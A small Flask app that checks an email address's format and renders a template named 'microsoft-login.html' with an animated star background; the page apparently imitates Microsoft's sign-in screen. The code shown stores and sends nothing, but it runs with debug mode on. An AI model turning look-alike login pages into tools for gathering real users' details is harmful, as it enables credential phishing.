from flask import Flask, render_template, request
import random

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    message = None
    if request.method == 'POST':
        email = request.form.get('email')
        if not email:
            message = "Por favor, ingresa tu correo electrónico."
        elif '@' not in email or '.' not in email:
            message = "Ingresa un correo electrónico válido."
        else:
            message = "Correo válido. Procediendo..."
    
    html_stars = ''
    for i in range(80):
        left = random.randint(0, 100)
        top = random.randint(0, 100)
        delay = random.uniform(0, 4)
        duration = random.uniform(2, 5)
        opacity = random.uniform(0.1, 0.6)
        html_stars += f'<div class="star" style="left: {left}%; top: {top}%; animation-delay: {delay}s; animation-duration: {duration}s; opacity: {opacity};"></div>'
    
    return render_template('microsoft-login.html', message=message, html_stars=html_stars)

if __name__ == '__main__':
    app.run(debug=True)